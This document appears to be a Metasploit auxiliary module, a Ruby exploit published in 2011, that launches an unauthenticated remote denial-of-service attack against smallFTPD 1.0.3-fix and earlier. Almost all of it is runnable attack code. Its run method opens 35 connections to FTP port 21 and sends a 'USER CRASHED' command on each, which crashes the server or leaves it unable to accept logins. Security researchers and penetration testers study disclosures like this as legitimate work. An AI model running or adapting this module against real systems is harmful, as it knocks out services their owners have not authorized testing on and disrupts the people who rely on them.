# Date: June 27, 2011
# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>
# Software Link: http://smallftpd.sf.net
# Version: 1.0.3-fix and earlier
# Tested on: windows xp, seven, 2k3
 
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::Tcp              
    include Msf::Auxiliary::Dos
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;smallFTPD Connection Saturation Remote Denial of Service&#039;,
            &#039;Description&#039;   => %q{
                This module triggers unauthenticated Denial-of-Service condition in SmallFTPD server versions 1.0.3-fix and earlier with a few dozens of connection requests. The vulnerability is probably conerned with smallftpd being unable to handle multiple connections regardless of its maximum connection settings. Upon successful DoS exploit, the smallftpd will crash or still seem functioning by showing its service banner. But in fact it stops denying new FTP  requests, which can be verified only through a valid login.
            },
            &#039;Author&#039;        => [ &#039;Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>&#039; ],
            &#039;License&#039;           => MSF_LICENSE,
            &#039;Version&#039;           => &#039;$Revision:  $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://core.yehg.net/lab/pr0js/advisories/smallftpd_103-fix_saturation_dos&#039; ]
                ],
            &#039;DisclosureDate&#039; => &#039;June 2010&#039;))
 
            register_options(
                [
                    Opt::RPORT(21)
                ],self.class)
    end
 
    def run
 
        print_status("Sending DOS Packets ...")
         
        35.times do |x|
            connect
            sock.put("USER CRASHED\r\n")           
            disconnect
        end
         
        print_good("Done")         
 
    end
 
end



